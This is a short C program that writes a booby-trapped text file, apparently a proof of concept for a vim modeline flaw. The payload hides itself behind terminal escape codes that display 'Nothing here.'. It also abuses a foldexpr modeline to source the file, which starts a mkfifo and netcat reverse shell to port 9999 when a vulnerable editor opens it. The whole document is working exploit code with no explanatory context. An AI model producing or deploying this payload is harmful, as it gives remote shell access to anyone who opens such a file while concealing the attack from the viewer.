#include <string.h>
#include <stdio.h>

int main() {
    FILE *fptr = fopen("demo3.txt", "wb");
    char payload[1024] = "\x1b[?7l\x1bSNothing here.\x1b:silent! w | silent! exec \'!rm -f /tmp/f\'| silent! exec \'!mkfifo /tmp/f\' | call system(\'nohup cat /tmp/f | /bin/sh 2>&1 | nc 127.0.0.1 9999 > /tmp/f &\') | redraw! | file | silent! # \" vim: set fen fdm=expr fde=assert_fails(\'set\\ fde=x\\ \\|\\ source\\!\\ \\%\') fdl=0: \x16\x1b[1G\x16\x1b[KNothing here.\"\x16\x1b[D \n";

    fwrite(payload, strlen(payload), 1, fptr);
    fclose(fptr);
    return 0;
}
